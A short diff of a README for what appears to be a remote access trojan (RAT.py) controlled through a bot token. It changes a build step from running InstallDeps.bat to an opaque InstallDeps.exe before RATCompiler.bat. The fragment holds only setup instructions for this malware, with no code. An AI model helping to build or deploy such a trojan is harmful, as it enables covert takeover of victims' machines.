@@ -49,7 +49,7 @@ Don't compile normally using pyinstaller, use the compiler provided
 - Fill up all the required information (BOT Token etc) in RAT.py
 - Finally, execute the following: 
 ```cmd
-InstallDeps.bat
+InstallDeps.exe
 RATCompiler.bat
 ```
 
